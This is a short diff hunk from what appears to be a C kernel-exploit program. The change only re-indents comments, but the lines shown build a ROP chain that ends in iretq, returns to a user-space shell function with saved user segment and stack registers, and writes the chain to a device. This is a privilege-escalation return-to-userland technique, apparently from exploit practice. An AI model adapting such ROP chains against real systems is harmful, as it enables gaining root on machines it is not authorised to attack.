@@ -265,10 +265,10 @@ int main()
 	rop[i++] = base+(iretq);		// iretq;
 	rop[i++] = (size_t)&shell;
 
-	rop[i++] = user_cs;		// cs
-	rop[i++] = user_rflags;		// rflags
-	rop[i++] = user_sp;		// rsp
-	rop[i++] = user_ss;		// ss
+	rop[i++] = user_cs;			// cs
+	rop[i++] = user_rflags;			// rflags
+	rop[i++] = user_sp;			// rsp
+	rop[i++] = user_ss;			// ss
 
 	ret = write(fd, rop, 0x100);
 	printf("%d ",ret);
